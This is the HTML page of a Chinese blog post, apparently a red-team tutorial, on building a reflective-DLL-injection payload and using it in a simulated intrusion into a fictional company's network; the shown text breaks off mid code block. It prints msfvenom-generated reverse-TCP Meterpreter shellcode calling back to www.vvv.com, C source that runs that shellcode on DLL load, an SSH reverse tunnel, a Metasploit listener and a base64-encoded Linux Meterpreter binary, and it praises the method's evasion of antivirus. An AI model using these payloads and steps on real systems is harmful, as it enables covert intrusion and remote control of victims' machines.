<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>反射式DLL注入自定义shellcode - Lucas - An InfoSec Lover</title>
  <link rel="alternate" hreflang="en" href="https://luxshell.github.io/" />
<link rel="stylesheet" type="text/css" href="/css/asciinema-player.css" />
<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="Lucas Wilson" />
  <meta name="description" content="反射式DLL注入，作为一种新的DLL注入方式，它不需要在文件系统存放目标DLL，减少了文件“落地”被删的风险。同时它不需要像常规的DLL注入方式那么套路，因此更容易通过杀软的行为检测。由于反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此用ProcessExplorer等软件也无法检测出进程加载了该DLL。这里基于HarmanySecurity的Stephen Fewer提出的ReflectiveDLL Injection制作自定义有效载荷的dll文件，进而完成一次远程注入的操作。

" />

  <meta name="keywords" content="Hugo, theme, jane" />






<meta name="generator" content="Hugo 0.40.1" />


<link rel="canonical" href="https://luxshell.github.io/post/custom_shellcode_over_reflective_dll_injection/" />



<link rel="icon" href="/favicon.ico" />










<link href="/dist/jane.min.css?v=2.7.0" rel="stylesheet">
<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">




<meta property="og:title" content="反射式DLL注入自定义shellcode" />
<meta property="og:description" content="反射式DLL注入，作为一种新的DLL注入方式，它不需要在文件系统存放目标DLL，减少了文件“落地”被删的风险。同时它不需要像常规的DLL注入方式那么套路，因此更容易通过杀软的行为检测。由于反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此用ProcessExplorer等软件也无法检测出进程加载了该DLL。这里基于HarmanySecurity的Stephen Fewer提出的ReflectiveDLL Injection制作自定义有效载荷的dll文件，进而完成一次远程注入的操作。

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://luxshell.github.io/post/custom_shellcode_over_reflective_dll_injection/" />



<meta property="article:published_time" content="2018-10-07T16:53:44&#43;08:00"/>

<meta property="article:modified_time" content="2018-10-07T16:53:44&#43;08:00"/>











<meta itemprop="name" content="反射式DLL注入自定义shellcode">
<meta itemprop="description" content="反射式DLL注入，作为一种新的DLL注入方式，它不需要在文件系统存放目标DLL，减少了文件“落地”被删的风险。同时它不需要像常规的DLL注入方式那么套路，因此更容易通过杀软的行为检测。由于反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此用ProcessExplorer等软件也无法检测出进程加载了该DLL。这里基于HarmanySecurity的Stephen Fewer提出的ReflectiveDLL Injection制作自定义有效载荷的dll文件，进而完成一次远程注入的操作。

">


<meta itemprop="datePublished" content="2018-10-07T16:53:44&#43;08:00" />
<meta itemprop="dateModified" content="2018-10-07T16:53:44&#43;08:00" />
<meta itemprop="wordCount" content="0">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="反射式DLL注入自定义shellcode"/>
<meta name="twitter:description" content="反射式DLL注入，作为一种新的DLL注入方式，它不需要在文件系统存放目标DLL，减少了文件“落地”被删的风险。同时它不需要像常规的DLL注入方式那么套路，因此更容易通过杀软的行为检测。由于反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此用ProcessExplorer等软件也无法检测出进程加载了该DLL。这里基于HarmanySecurity的Stephen Fewer提出的ReflectiveDLL Injection制作自定义有效载荷的dll文件，进而完成一次远程注入的操作。

"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Lucas&#39; Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a><a href="https://gohugo.io">
        <li class="mobile-menu-item">external-link</li>
      </a>
  </ul>
</nav>

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      Lucas&#39; Blog
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="/">Home</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="/post/">Archives</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="/tags/">Tags</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="/categories/">Categories</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="/about/">About</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://gohugo.io" rel="noopener" target="_blank">
              external-link
            <i class="iconfont icon-new-window"></i>
            </a>
          

        

      </li>
    
  </ul>
</nav>
  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">反射式DLL注入自定义shellcode</h1>
      
      <div class="post-meta">
        <span class="post-time"> 2018-10-07 </span>
        
        <span class="more-meta"> 0 words </span>
        <span class="more-meta"> 0 min read </span>
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#制作dll">制作DLL</a></li>
<li><a href="#应用场景">应用场景</a>
<ul>
<li><a href="#场景设定">场景设定</a></li>
<li><a href="#网络拓扑设定">网络拓扑设定</a></li>
</ul></li>
<li><a href="#模拟渗透简单过程">模拟渗透简单过程</a>
<ul>
<li><a href="#确定目标">确定目标</a></li>
<li><a href="#常见端口扫描">常见端口扫描</a></li>
<li><a href="#进入后台">进入后台</a></li>
<li><a href="#反弹meter">反弹meter</a></li>
<li><a href="#内网端口扫描">内网端口扫描</a></li>
<li><a href="#漏洞扫描">漏洞扫描</a></li>
<li><a href="#布置内网渗透环境">布置内网渗透环境</a></li>
</ul></li>
<li><a href="#视频演示">视频演示</a></li>
<li><a href="#结语">结语</a></li>
<li><a href="#来源和引文">来源和引文</a></li>
<li><a href="#责任声明">责任声明</a></li>
</ul></li>
</ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <p>反射式DLL注入，作为一种新的DLL注入方式，它不需要在文件系统存放目标DLL，减少了文件“落地”被删的风险。同时它不需要像常规的DLL注入方式那么套路，因此更容易通过杀软的行为检测。由于反射式注入方式并没有通过LoadLibrary等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此用ProcessExplorer等软件也无法检测出进程加载了该DLL。这里基于HarmanySecurity的Stephen Fewer提出的ReflectiveDLL Injection制作自定义有效载荷的dll文件，进而完成一次远程注入的操作。</p>

<p></p>

<h2 id="制作dll">制作DLL</h2>

<p>这里针对x86的系统作案例，x64的后续跟进。有效载荷以msf针对meterpreter的shellcode为例。</br>
获取需要的shellcode，反弹主机<code>www.vvv.com</code>，端口为<code>80</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>www.vvv.com <span class="nv">LPORT</span><span class="o">=</span><span class="m">80</span> -f c

<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span class="m">341</span> bytes
Final size of c file: <span class="m">1457</span> bytes
unsigned char buf<span class="o">[]</span> <span class="o">=</span> 
<span class="s2">&#34;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&#34;</span>
<span class="s2">&#34;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&#34;</span>
<span class="s2">&#34;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&#34;</span>
<span class="s2">&#34;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&#34;</span>
<span class="s2">&#34;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&#34;</span>
<span class="s2">&#34;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&#34;</span>
<span class="s2">&#34;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&#34;</span>
<span class="s2">&#34;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&#34;</span>
<span class="s2">&#34;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&#34;</span>
<span class="s2">&#34;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&#34;</span>
<span class="s2">&#34;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&#34;</span>
<span class="s2">&#34;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x03\x03\x03\x03&#34;</span>
<span class="s2">&#34;\x68\x02\x00\x00\x50\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&#34;</span>
<span class="s2">&#34;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&#34;</span>
<span class="s2">&#34;\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&#34;</span>
<span class="s2">&#34;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&#34;</span>
<span class="s2">&#34;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00&#34;</span>
<span class="s2">&#34;\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56&#34;</span>
<span class="s2">&#34;\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&#34;</span>
<span class="s2">&#34;\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5&#34;</span>
<span class="s2">&#34;\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85&#34;</span>
<span class="s2">&#34;\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1&#34;</span>
<span class="s2">&#34;\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&#34;</span><span class="p">;</span></code></pre></td></tr></table>
</div>
</div>
<p>到Stephen Fewer的一个项目下载源代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><span class="lnt">1
</span></pre></td>
<td class="lntd">
<pre class="chroma">https://github.com/stephenfewer/ReflectiveDLLInjection</pre></td></tr></table>
</div>
</div>
<p>修改<code>ReflectiveDLLInjection/dll/src/ReflectiveDll.c</code>的内容为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">//===============================================================================================//
</span><span class="c1">// This is a stub for the actuall functionality of the DLL.
</span><span class="c1">//===============================================================================================//
</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&#34;ReflectiveLoader.h&#34;</span><span class="cp">
</span><span class="cp">#pragma comment(linker, &#34;/section:.data,RWE&#34;)
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">&#34;</span><span class="se">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x03\x03\x03\x03</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x68\x02\x00\x00\x50\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1</span><span class="s">&#34;</span>
<span class="s">&#34;</span><span class="se">\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>

<span class="c1">// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
</span><span class="c1">// defined in the project properties (Properties-&gt;C++-&gt;Preprocessor) so as we can specify our own 
</span><span class="c1">// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.
</span><span class="c1"></span>
<span class="c1">// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
</span><span class="c1"></span><span class="k">extern</span> <span class="n">HINSTANCE</span> <span class="n">hAppInstance</span><span class="p">;</span>
<span class="c1">//===============================================================================================//
</span><span class="c1"></span><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">BOOL</span> <span class="n">bReturnValue</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
	<span class="k">switch</span> <span class="p">(</span><span class="n">dwReason</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="nl">DLL_QUERY_HMODULE</span><span class="p">:</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">lpReserved</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
			<span class="o">*</span><span class="p">(</span><span class="n">HMODULE</span> <span class="o">*</span><span class="p">)</span><span class="n">lpReserved</span> <span class="o">=</span> <span class="n">hAppInstance</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="p">{</span>
		<span class="n">hAppInstance</span> <span class="o">=</span> <span class="n">hinstDLL</span><span class="p">;</span>
		<span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buf</span><span class="p">;</span>
		<span class="n">ret</span><span class="p">();</span>
		<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
		<span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
	<span class="k">return</span> <span class="n">bReturnValue</span><span class="p">;</span>
<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<p>其中<code>#pragma comment(linker, &quot;/section:.data,RWE&quot;)</code>告知编译器赋予data段的读写及执行权限，<code>buf</code>变量即上面自定义生成的关于meter的shellcode的十六进制字符形态。</br>
编译项目得到dll文件备用，博主是采用的是VS2013 Ultmate。</p>

<h2 id="应用场景">应用场景</h2>

<p>本博文采用比较综合一点的案例进行dll的反射注入。</p>

<h3 id="场景设定">场景设定</h3>

<p>TTT公司一名开发人员不小心将内部测试系统公开到了外网<code>www.ttt.com</code>，不幸的是被有心人盯上了，最后使得内部一台重要的机器沦陷。</p>

<h3 id="网络拓扑设定">网络拓扑设定</h3>

<p><img src="/images/dll.jpg" alt="dll" /></p>

<p>[0918]kali(Pen)：渗透主力机器，负责建立通向目标内部的代理</br>
[1006]cstmrProxyFW(Pen)：负责将内网渗透流量导入由kali建立的代理，可看作是内网渗透的一个路由，可对进入内网的流量进行严格把控</br>
[1006]win2003sp2(Pen)：内网渗透机器</br>
[1002]web(cstmr)：目标内部的一台测试系统，这里为了演示，用《msf魔鬼训练营》的靶机替代</br>
[1007]win7x86(cstmr)：目标内部比较重要的机器</p>

<h2 id="模拟渗透简单过程">模拟渗透简单过程</h2>

<h3 id="确定目标">确定目标</h3>

<p>以<code>www.ttt.com</code>展开测试，公网IP为5.5.5.5</p>

<h3 id="常见端口扫描">常见端口扫描</h3>

<p>经过端口扫描发现80端口开放。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# proxychains nmap -n -Pn -sT -v --open -p <span class="m">22</span>,80,443 <span class="m">5</span>.5.5.5
ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
Starting Nmap <span class="m">7</span>.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2018</span>-10-07 <span class="m">12</span>:29 EDT
Initiating Connect Scan at <span class="m">12</span>:29
Scanning <span class="m">5</span>.5.5.5 <span class="o">[</span><span class="m">3</span> ports<span class="o">]</span>
Discovered open port <span class="m">80</span>/tcp on <span class="m">5</span>.5.5.5</code></pre></td></tr></table>
</div>
</div>
<h3 id="进入后台">进入后台</h3>

<p>很容易发现登录页面存在注入漏洞，且存在验证缺陷，可直接导致进入后台页面进行操作，并找到一处命令执行，获取到系统版本信息，为32位系统，详情请看视频演示</p>

<h3 id="反弹meter">反弹meter</h3>

<p>远程端口转发将本地的80端口映射到<code>www.vvv.com</code>的80端口上</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# ssh -o <span class="s2">&#34;ProxyCommand /usr/bin/nc -X 5 -x 172.16.83.123:8080 %h %p&#34;</span> -fNR <span class="m">80</span>:127.0.0.1:80 www.vvv.com</code></pre></td></tr></table>
</div>
</div>
<p>启动控制段监听服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">msf &gt; use exploit/multi/handler 
msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload linux/x86/meterpreter/reverse_tcp
<span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
smsf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost <span class="m">127</span>.0.0.1
<span class="nv">lhost</span> <span class="o">=</span>&gt; <span class="m">127</span>.0.0.1
msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">80</span>
<span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">80</span>
msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit </code></pre></td></tr></table>
</div>
</div>
<p>生成32位linux反弹meter的二进制文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>www.vvv.com <span class="nv">LPORT</span><span class="o">=</span><span class="m">80</span> -f elf -o meter
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span class="m">123</span> bytes
Final size of elf file: <span class="m">207</span> bytes
Saved as: meter</code></pre></td></tr></table>
</div>
</div>
<p>对生成的二进制文件进行base64编码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# base64 meter 
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
AAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toAwMDA2gCAABQ
ieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMM
sH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A</code></pre></td></tr></table>
</div>
</div>
<p>将编码后的内容打包到目标机器运行，内容如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
